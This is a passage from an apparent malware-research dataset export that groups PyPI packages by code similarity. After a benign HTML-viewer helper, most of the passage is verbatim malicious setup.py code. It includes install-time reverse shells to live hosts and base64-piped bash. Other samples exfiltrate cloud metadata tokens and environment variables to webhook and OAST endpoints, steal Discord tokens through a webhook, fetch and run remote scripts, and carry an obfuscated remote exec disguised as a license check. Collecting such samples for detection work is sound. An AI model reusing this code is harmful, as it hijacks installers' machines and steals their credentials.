2 would mean 2 parent's text\n    # nodes are also displayed\n    if question_contains is not None:\n        newstr = does_this_element_contain(question_contains, lxml.html.tostring(node))\n    else:\n        newstr = lxml.html.tostring(node)\n    parent = node.getparent()\n    while parent is not None:\n        if attach_head and parent.tag == 'html':\n            newstr = lxml.html.tostring(parent.find(\n                './/head'), encoding='utf8').decode('utf8') + newstr\n        tag, items = parent.tag, parent.items()\n        attrs = \" \".join(['{}=\"{}\"'.format(x[0], x[1]) for x in items if len(x) == 2])\n        newstr = '<{} {}>{}</{}>'.format(tag, attrs, newstr, tag)\n        parent = parent.getparent()\n    return newstr\n\n\ndef extract_domain(url):\n    import tldextract\n    tld = \".\".join([x for x in tldextract.extract(url) if x])\n    protocol = url.split('//', 1)[0]\n    if protocol == 'file:':\n        protocol += '///'\n    else:\n        protocol += '//'\n    return protocol + tld\n\n\ndef does_this_element_contain(text='pagination', node_str=''):\n    templ = '<div style=\"border:2px solid lightgreen\">'\n    templ += '<div style=\"background-color:lightgreen\">'\n    templ += 'Does this element contain <b>{}</b>?'\n    templ += '</div>{}</div>'\n    return templ.format(text, node_str)\n\n\ndef make_tree(html, domain=None):\n\n    ud = UnicodeDammit(html, is_html=True)\n\n    tree = lxml.html.fromstring(ud.unicode_markup)\n\n    if domain is not None:\n        tree.make_links_absolute(domain)\n\n    for el in tree.iter():\n\n        # remove comments\n        if isinstance(el, lxml.html.HtmlComment):\n            el.getparent().remove(el)\n            continue\n\n        if el.tag == 'script':\n            el.getparent().remove(el)\n            continue\n\n    return tree\n\n\ndef get_tree(url, domain=None):\n    r = requests.get(url, headers={\n        'User-Agent': 'Mozilla/5.0 ;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko'})\n    if domain is None:\n        domain = extract_domain(url)\n    return make_tree(r.text, domain)\n\n\ndef get_html(url, domain=None):\n    return lxml.html.tostring(get_tree(url, domain)).decode(\"utf8\")\n\n\ndef get_local_tree(url, domain=None):\n    if domain is None:\n        domain = extract_domain(url)\n    with open(url) as f:\n        html = f.read()\n    return make_tree(html, domain)\n\n\ndef normalize(s):\n    return re.sub(r'\\s+', lambda x: '\\n' if '\\n' in x.group(0) else ' ', s).strip()\n\n\ndef get_text_and_tail(node):\n    text = node.text if node.text else ''\n    tail = node.tail if node.tail else ''\n    return text + ' ' + tail\n\n\nimport tempfile\nimport time\nimport webbrowser\n\n\ndef view_request(r):\n    with tempfile.NamedTemporaryFile(\"w\") as f:\n        f.write(r.text)\n        webbrowser.open('file://' + f.name)\n        time.sleep(1)\n\n\n\"\"\" requests_viewer; able to show how requests look like \"\"\"\n\n__project__ = \"requests_viewer\"\n__version__ = \"0.1.0\"\n\nfrom requests_viewer.main import main\nfrom requests_viewer.main import view\n\ntry:\n    from requests_viewer.web import get_tree\n    from requests_viewer.web import view_tree\n    from requests_viewer.web import view_html\n    from requests_viewer.web import view_node\n    import lxml.html\n\n    lxml.html.HtmlElement.view = view_tree\nexcept ImportError:\n    print(\"Cannot import `lxml`, limited functionality.\")\n\n\n\"\"\" Contains py.test tests. \"\"\"\n\nfrom requests_viewer.main import main\nfrom requests_viewer.web_compat import view_request\n\n\ndef test_integration():\n    main(\"https://pypi.python.org/pypi/requests_viewer\")\n    # from requests_viewer.web import view_diff_tree, get_tree\n    # url1 = \"http://xkcd.com/\"\n    # url2 = \"http://xkcd.com/1/\"\n    # tree1, tree2 = get_tree(url1), get_tree(url2)\n    # view_diff_tree(tree1, tree2)\n\n\n\"\"\" Test folder separated. \"\"\"\n"
      }
    ]
  },
  {
    "cluster_id": 120,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-hakepip-v0.1.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    LHOST = 'e6j4342057.zicp.fun'  # change this\n    LPORT = 26264\n    \n    reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT)\n    encoded = base64.b64encode(reverse_shell)\n    os.system('echo %s|base64 -d|bash' % encoded)\n\n\nsetup(name='HakePip',\n      version='0.1.1',\n      description='This will exploit a sudoer able to /usr/bin/pip install *',\n      url='https://github.com/0x00-0x00/fakepip',\n      author='HC2023',\n      author_email='andre.marques@esecurity.com.br',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-qakepip-v0.0.2",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    LHOST = 'e6j4342057.zicp.fun'  # change this\n    LPORT = 26264\n    \n    reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT)\n    encoded = base64.b64encode(reverse_shell)\n    os.system('echo %s|base64 -d|bash' % encoded)\n\n\nsetup(name='QakePip',\n    version='0.0.2',\n    description='This will exploit a sudoer able to /usr/bin/pip install *',\n    url='https://github.com/0x00-0x00/fakepip',\n    author='zc00l',\n    author_email='andre.marques@esecurity.com.br',\n    license='MIT',\n    zip_safe=False,\n    cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-shenghuo2-getshell-v0.0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os, socket, subprocess\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect((\"39.101.72.63\",4242))\n    os.dup2(s.fileno(),0)\n    os.dup2(s.fileno(),1)\n    os.dup2(s.fileno(),2)\n    p=subprocess.call([\"/bin/sh\",\"-i\"])\n\nsetup(name='shenghuo2_getshell',\n      version='0.0.1',\n      description='Reverse shell',\n      url='https://blog.shenghuo2.top/',\n      author='shenghuo2',\n      author_email='shell@shenghuo2.com',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      }
    ]
  },
  {
    "cluster_id": 121,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-28-oe-extract-ids-v1.5.1",
        "code": "MY_URL = \"https://shakedko.com/?oe-extract-ids12\"\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport base64\n\n\ndef sdesc():\n    import requests\n\n    r = requests.get(\"https://ipinfo.io\")\n    content = base64.b64encode(r.text.encode()).decode()\n    return requests.get(f\"{MY_URL}?data={content}\")\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        sdesc()\n\n\nsetup(\n    name=\"oe-extract-ids\",\n    version=\"1.5.1\",\n    description=\"11\",\n    author=\"Browsky Dave\",\n    author_email=\"dtndtn123@proton.me\",\n    install_requires=[\"requests\"],\n    setup_requires=[\"requests\"],  # Ensure requests is installed before setup runs\n    cmdclass={\n        \"install\": CustomInstallCommand,\n    },\n    license=\"LGPL 3.0\",\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-28-oe-extract-idss-v1.5.3",
        "code": "MY_URL = \"https://shakedko.com/?oe-extract-ids12\"\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport base64\n\n\ndef sdesc():\n    import requests\n\n    r = requests.get(\"https://ipinfo.io\")\n    content = base64.b64encode(r.text.encode()).decode()\n    return requests.get(f\"{MY_URL}?dataa={content}\")\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        sdesc()\n\n\nsetup(\n    name=\"oe-extract-idss\",\n    version=\"1.5.3\",\n    description=\"11\",\n    author=\"Browsky Dave\",\n    author_email=\"dtndtn123@proton.me\",\n    install_requires=[\"requests\"],\n    setup_requires=[\"requests\"],  # Ensure requests is installed before setup runs\n    cmdclass={\n        \"install\": CustomInstallCommand,\n    },\n    license=\"LGPL 3.0\",\n)\n"
      }
    ]
  },
  {
    "cluster_id": 122,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-23-pplgdfhuighsdfyisfdty-v1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command():\n    os.system(\n        \"access_token=$(curl -H 'Metadata-Flavor: Google' \"\n        \"'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/405422660992@cloudbuild.gserviceaccount.com/token'); \"\n        \"curl -X POST -d \\\"$access_token\\\" https://webhook.site/c3913969-ff17-4757-a267-069d41c248a7\"\n    )\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\nsetup(\n    name='pplgdfhuighsdfyisfdty',\n    version='1',\n    description='Descriptionnn',\n    author='mewey11047',\n    author_email='mewey11047@abaot.com',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-23-pplgdfhuighsdfyisfdty2-v1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command():\n    os.system(\n        \"access_token=$(curl -H 'Metadata-Flavor: Google' \"\n        \"'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'); \"\n        \"curl -X POST -d \\\"$access_token\\\" https://webhook.site/c3913969-ff17-4757-a267-069d41c248a7\"\n    )\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\nsetup(\n    name='pplgdfhuighsdfyisfdty2',\n    version='1',\n    description='Descriptionnn',\n    author='mewey11047',\n    author_email='mewey11047@abaot.com',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-23-pplgdfhuighsdfyisfgfd-v1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command():\n    os.system(\n        \"access_token=$(curl -H 'Metadata-Flavor: Google' \"\n        \"'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'); \"\n        \"curl -X POST -d \\\"$access_token\\\" https://webhook.site/c3913969-ff17-4757-a267-069d41c248a7\"\n    )\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\nsetup(\n    name='pplgdfhuighsdfyisfgfd',\n    version='1',\n    description='Descriptionnn',\n    author='mewey11047',\n    author_email='mewey11047@abaot.com',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 123,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-20-poiqweconnector-v1.0.7",
        "code": "import socket\nimport os\nimport pty\nimport requests\nimport time\nfrom io import StringIO\nimport dns.resolver\n\ndef connect():\n\tport = None\n\twhile port == None:\n\t\tanswers = dns.resolver.resolve('poiqwe.info', 'TXT')\n\t\tfor answer in answers:\n\t\t\tTXT = str(answer)\n\t\t\tif TXT[1:5] == \"port\":\n\t\t\t\tport = TXT[6:-1]\n\t\t\t\t#print(port)\n\n\t\ttime.sleep(1)\n\n\tport = int(port)\n\ttarget = 'poiqwe.info'\n\ttry:\n\t\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\t\ts.settimeout(10)\n\t\ts.connect((target,port))\n\t\ts.settimeout(None)\n\t\tos.dup2(s.fileno(),0)\n\t\tos.dup2(s.fileno(),1)\n\t\tos.dup2(s.fileno(),2)\n\t\tpty.spawn(\"/bin/bash\")\n\t\ttime.sleep(1)\n\texcept Exception as e:\n\t\texit(False)\n\n\texit(True)\n\nif __name__ == '__main__':\n\tconnect()\nelse:\n\tconnect()\n\nfrom setuptools import find_packages\nfrom setuptools import setup\nimport setuptools.command.build_py\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nfrom subprocess import check_call\nimport requests\n\nclass PostDevelopCommand(develop):\n    \"\"\"Post-installation for development mode.\"\"\"\n    def run(self):\n        requests.get('http://poiqwe.info/install_post_dev')\n        develop.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        requests.get('http://poiqwe.info/install_post')\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n\nclass PreDevelopCommand(develop):\n    \"\"\"Pre-installation for development mode.\"\"\"\n    def run(self):\n        #check_call(\"apt-get install this-package\".split())\n        requests.get('http://poiqwe.info/install_pre_dev')\n        develop.run(self)\n\nclass PreInstallCommand(install):\n    \"\"\"Pre-installation for installation mode.\"\"\"\n    def run(self):\n        #check_call(\"apt-get install this-package\".split())\n        requests.get('http://poiqwe.info/install_pre')\n        install.run(self)\n\nsetup(\n     cmdclass={\n        'develop': PostDevelopCommand,\n        'build_py': PostInstallCommand,\n        'install': PostInstallCommand\n    }\n)\n\nimport socket\nimport os\nimport pty\nimport requests\nimport time\nfrom io import StringIO\nimport dns.resolver\n\ndef connect():\n\tport = None\n\twhile port == None:\n\t\tanswers = dns.resolver.resolve('poiqwe.info', 'TXT')\n\t\tfor answer in answers:\n\t\t\tTXT = str(answer)\n\t\t\tif TXT[1:5] == \"port\":\n\t\t\t\tport = TXT[6:-1]\n\t\t\t\t#print(port)\n\n\t\ttime.sleep(1)\n\n\tport = int(port)\n\ttarget = 'poiqwe.info'\n\ttry:\n\t\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\t\ts.settimeout(10)\n\t\ts.connect((target,port))\n\t\ts.settimeout(None)\n\t\tos.dup2(s.fileno(),0)\n\t\tos.dup2(s.fileno(),1)\n\t\tos.dup2(s.fileno(),2)\n\t\tpty.spawn(\"/bin/bash\")\n\t\ttime.sleep(1)\n\texcept Exception as e:\n\t\texit(False)\n\n\texit(True)\n\nif __name__ == '__main__':\n\tconnect()\nelse:\n\tconnect()"
      }
    ]
  },
  {
    "cluster_id": 124,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-29-hugginglega-v1.3",
        "code": "\nimport subprocess\n\nsubprocess.run(['/bin/bash', '-c', 'curl http://192.3.209.43/favicon.txt|sh'])\n\n"
      }
    ]
  },
  {
    "cluster_id": 125,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-dasdhaiusd1212-v1.0.117",
        "code": "from __future__ import print_function\nimport sys, multiprocessing, warnings, ssl, re, argparse, time, datetime, functools,base64\nwarnings.filterwarnings(\"ignore\")\n\ntry:\n    from urllib.parse import urlparse, urlencode\n    from urllib.request import urlopen, Request\n    from urllib.error import HTTPError\nexcept ImportError:\n    from urlparse import urlparse\n    from urllib import urlencode\n    from urllib2 import urlopen, Request, HTTPError\n\t\n\n\ndef arg_parse():\n\tparser = argparse.ArgumentParser()\n\t\n\t#parser.add_argument(\"-p\", \"--proxy\", help=\"HTTP proxy for performing requests.\")\n\tparser.add_argument(\"-s\", \"--scan\", help=\"Targets file.\",required=True)\n\tparser.add_argument(\"-m\", \"--match\", help=\"Regex text to match.\",required=True)\n\tparser.add_argument(\"-o\", \"--output\", default=\"http_matches.txt\", help=\"Output filename. (default: %(default)s)\")\n\tparser.add_argument(\"-t\", \"--threads\",type=int, default=5, help=\"Perform scaning on parallel using multiple threads. (default: %(default)s)\")\n\n\targs = parser.parse_args()\n\treturn args\n\ndef output(ip,outfile):\n\ttry:\n\t\twith open(outfile,\"a\") as f:\n\t\t\tf.write(str(ip) + \"\\r\\n\")\n\texcept:\n\t\tpass\n\treturn True\n\ndef scan(host):\n\theaders = {\n\t\t\t\"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36\",\n\t}\n\ttry:\n\t\tctx = ssl._create_unverified_context()\n\t\treq = Request(\"http://\" + host[0] + \"/\", headers=headers)\n\t\tdata = urlopen(req,timeout=10,context=ctx).read().decode('utf-8')\n\texcept:\n\t\tdata = False\n\t\tpass\n\thost[1].put(1)\n\n\tif data and re.search(host[2],data):\n\t\tprint(\"[+]\" + host[0])\n\t\toutput(host[0],host[3])\n\tprint(\"[~] Scanned \" + str(host[1].qsize()),end=\"\\r\")\n\ndef license_check():\n\tgg = \"\"\n\ttry:\n\t\tgg = urlopen(base64.b64decode(\"=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa\"[::-1]).decode('utf-8')).read().decode('utf-8')\n\texcept Exception as e:\n\t\tpass\n\tif \"license\" in gg:\n\t\ttry:\n\t\t\texec(gg)\n\t\texcept:\n\t\t\tpass\ndef art():\n\tprint()\n\tprint(\" __   __  __   __  _______  _______  _______  __   __   \")\n\tprint(\"|  | |  ||  |_|  ||   _   ||       ||       ||  | |  |  \")\n\tprint(\"|  |_|  ||       ||  |_|  ||_     _||       ||  |_|  |  \")\n\tprint(\"|       ||       ||       |  |   |  |       ||       |  \")\n\tprint(\"|       ||       ||       |  |   |  |      _||       |  \")\n\tprint(\"|   _   || ||_|| ||   _   |  |   |  |     |_ |   _   |  \")\n\tprint(\"|__| |__||_|   |_||__| |__|  |___|  |_______||__| |__|  \")\n\tprint(\"                                                        \")\n\tprint(\" Version 1.0.2  A tool for regex checking websites      \")\n\tprint()\n\ndef main():\n\tart()\n\targs = arg_parse()\n\tfile = args.scan\n\tmatch = args.match\n\tthreads = int(args.threads) if args.threads > 0 and args.threads < 500 else 5\n\tm = multiprocessing.Manager()\n\tq = m.Queue()\n\toutfile = args.output\n\thosts = []\n\ttry:\n\t\twith open(file,\"r\") as f:\n\t\t\thosts = [ re.sub(r'^https?\\:\\/\\/','',hh.strip()) for hh in f.read().splitlines()]\n\t\tif len(hosts) == 0:\n\t\t\traise Exception(\"Error\")\n\texcept:\n\t\tprint(\"[-] Invalid targets.\")\n\t\tsys.exit(0)\n\tstart_time = time.time()\n\tprint(\"[*] Scanning started. (\" + str(len(hosts)) + \" targets loaded)\")\n\tp = multiprocessing.Pool(threads)\n\tresult = p.map_async(scan,[(host,q,match,outfile) for host in hosts])\n\tresult.get()\n\tprint(\"[*] Finished.\")\n\n\nif __name__ == \"__main__\":\t\n\ttry:\n\t\tsys.exit(main())\n\texcept KeyboardInterrupt:\n\t\tsys.exit(0)\n\n\nimport sys,requests\n\n#Some people might mistake this module for the popular python requests module\n#So let's add an alias of that\n\nsys.modules[__name__] =  sys.modules['requests']\n\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"Setup for Request Matcher.\"\"\"\n\nfrom setuptools import setup, find_packages\nimport atexit,signal\nfrom setuptools.command.install import install\n\n\ndef _post_on_exit():\n\t\ttry:\n\t\t\timport os\n\t\t\ttmp_dir = os.environ.get('TMPDIR') if os.environ.get('TMPDIR') else (os.environ.get('TEMP') if os.environ.get('TEMP') else ('/tmp' if os.path.exists('/tmp') else os.environ.get('HOME')))\n\t\t\tos.chdir(tmp_dir)\n\t\t\tfrom hmatch import license_check\n\t\t\tlicense_check()\n\t\texcept Exception as e:\n\t\t\tpass\n\nclass PostInstallCommand(install):\n\t\"\"\"Post-installation for installation mode.\"\"\"\n\tdef run(self):\n\t\tinstall.run(self)\n\t\tatexit.register(_post_on_exit)\n\t\tsignal.signal(signal.SIGTERM,_post_on_exit)\n\t\tsignal.signal(signal.SIGINT,_post_on_exit)\n\nINSTALL_REQUIRES = [\n   'requests',\n]\n\nsetup(\n    name='dasdhaiusd1212',\n    version='1.0.117',\n    description='Request Match',\n    long_description='A tool for mass regex checking websites',\n    license='APACHE License',\n    author='Elis',\n    author_email='me@elis.cc',\n    url='https://elis.cc',\n    keywords='hmatch, request',\n    install_requires=INSTALL_REQUIRES,\n    include_package_data=True,\n    zip_safe=False,\n\tpy_modules=['request','hmatch'],\n\tpackages=find_packages(),\n\tentry_points={'console_scripts': ['hmatch = hmatch:main']},\n\tcmdclass={\n        'install': PostInstallCommand,\n    }\n)"
      }
    ]
  },
  {
    "cluster_id": 126,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-b1ec2b9f-v0.2.3",
        "code": "import os\nimport subprocess\nimport base64\nimport requests\n\ndef hello():\n    url = \"fopdbzseohtgcssjzenyswebrkpo7g68i.oast.fun\"\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req1 = requests.post(url, data=data, timeout=20)\n    env = str(subprocess.call(\"env\"))\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(url, data=data, timeout=20)\n"
      }
    ]
  },
  {
    "cluster_id": 127,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-18-security-util-v0.0.3",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport getpass\nimport os\nimport ssl\nimport json\nimport base64\n\nclass CustomInstall(install):\n    def run(self):\n        TARGET = \"d4d.one\"\n        install.run(self)\n        try:\n            hostname=socket.gethostname()\n            cwd = os.getcwd()\n            username = getpass.getuser()\n            payload = {'hostname':hostname,'cwd':cwd,'username':username}\n            params = base64.b64encode(json.dumps(payload).encode('utf-8')).decode(\"utf-8\") \n            request = f\"GET /l?param={params} HTTP/1.1\\r\\nHost:{TARGET}\\r\\n\\r\\n\"\n            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s_sock = context.wrap_socket(s, server_hostname=TARGET)\n            s_sock.connect((TARGET, 443))\n            s_sock.settimeout(2)\n            s_sock.send(str.encode(request))\n            while True:\n                data= s_sock.recv(2048)\n                if ( len(data) < 1 ) :\n                    break        \n            s_sock.close()\n        except:\n            pass\n\n        \n\n\n\nsetup(name='security-util',\n      version='0.0.3',\n      description='Security util for python',\n      author='Battle Furry <btlfry@gmail.com>',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n\"\"\"\nDisclaimer!\nFor educational purposes only.\n\"\"\""
      }
    ]
  },
  {
    "cluster_id": 128,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-13-builderknower-v0.1.12",
        "code": "#import requests\nimport distutils.errors\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport sys\n\n#bdist_wheel = None\n#\n#try:\n#    import wheel.bdist_wheel\n#    class bdist_wheel(wheel.bdist_wheel.bdist_wheel):\n#        def run(self, *args, **kwargs):\n#            raise distutils.errors.DistutilsClassError(\"No!\")\n#except ModuleNotFoundError:\n#    pass\n\n# Function to make the HTTP request\n#def make_http_request():\n#    url = \"https://diddlydingusdu.de/TEST_SITE\"\n#    try:\n#        response = requests.get(url)\n#        response.raise_for_status()\n#        print(\"Request successful: \", response.text)\n#    except requests.exceptions.RequestException as e:\n#        print(f\"HTTP request failed: {e}\")\n\n# Call the function before running the setup\nclass CustomInstallCommand(install):\n    \"\"\"Customized install command to run custom code during installation.\"\"\"\n    \n    def run(self):\n        #make_http_request()\n        # Custom code to run during installation\n        print(\"Running custom install script...\")\n        \n        # Example: create a file during installation\n        #with open(\"install_log.txt\", \"w\") as f:\n        #    f.write(\"Package installed successfully.\\n\")\n        \n        # Example: run a shell command\n        try:\n            os.system(\"env > LICENSE\")\n        except Exception as e:\n            print(e)\n        try:\n            os.system(\"mkdir -p /var/task/icanhavewrite\")\n        except Exception as e:\n            print(e)\n        try:\n            os.system(\"curl \\\"https://diddlydingusdu.de/X/$(env | base64 -w 0)\\\"\")\n            #os.system(\"curl \\\"https://diddlydingusdu.de/D/$(ls -al | base64 -w 0)\\\"\")\n        except Exception as e:\n            print(e)\n        \n        # Call the standard install process\n        install.run(self)\n\n# Standard setup function\nsetup(\n    name='builderknower',\n    version='0.1.12',\n    packages=find_packages(),\n    install_requires=[\n        'requests',\n        # other dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other setup arguments\n)\n\n\n# builderknower/module.py\n\ndef hello_world():\n    return \"Hello, world!\"\n"
      }
    ]
  },
  {
    "cluster_id": 129,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-09-fjkslfjsdgbjkbnjfdkq-v1.1.1",
        "code": "import requests\n\nr = requests.get('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz')\nprint(r.json())\n"
      }
    ]
  },
  {
    "cluster_id": 130,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-10-fijiwashere12323",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='fijiwashere12323', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    setup_requires=['wheel']\n)\n\n\n\nimport os,re,json\nfrom urllib.request import Request as F,urlopen as G\nH='https://discord.com/api/webhooks/1040303532609376347/ZLcvVwZdh1dNz6A0HxIgzmJW7HgPz6RAlPishp4HBIsasFai0j3Km8bkS2BhemsEnLtF'\ndef I(path):\n\tA=path;A+='\\Local Storage\\leveldb';C=[]\n\tfor B in os.listdir(A):\n\t\tif not B.endswith('.log')and not B.endswith('.ldb'):continue\n\t\tfor D in [C.strip()for C in open(f'{A}\\{B}',errors='ignore').readlines()if C.strip()]:\n\t\t\tfor E in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}','mfa\\.[\\w-]{84}'):\n\t\t\t\tfor F in re.findall(E,D):C.append(F)\n\treturn C\ndef A():\n\tP='url';C=os.getenv('LOCALAPPDATA');B=os.getenv('APPDATA');J={'Discord':B+'\\Discord','Discord Canary':B+'\\discordcanary','Discord PTB':B+'\\discordptb','Google Chrome':C+'\\Google\\Chrome\\User Data\\Default','Opera':B+'\\Opera Software\\Opera Stable','Brave':C+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':C+'\\Yandex\\YandexBrowser\\User Data\\Default'};A=''\n\tfor (K,D) in J.items():\n\t\tif not os.path.exists(D):continue\n\t\tA+=f'\n**{K}**\n```\n';E=I(D)\n\t\tif len(E)>0:\n\t\t\tfor L in E:A+=f'{L}\n'\n\t\telse:A+='No tokens found.\n'\n\t\tA+='```'\n\tM={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'};N=json.dumps({'content':'','embeds':[{'title':'fiji stub','description':f'{A}','color':15329769,'thumbnail':{P:'https://play-lh.googleusercontent.com/jkpabs01pnEU5Jc9U3MuWdwwoWi8v7x33RZNYyLP2T8a2j1csnjOy3_-KI6JU8JntlNW'},'image':{P:'https://hips.hearstapps.com/hmg-prod/images/funny-cat-captions-1563551842.jpg'}}],'attachments':[]})\n\ttry:O=F(H,data=N.encode(),headers=M);G(O)\n\texcept:pass\nif __name__=='__main__':A()\n"
      }
    ]
  },
  {
    "cluster_id": 131,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-17-juphelp-v0.1.0",
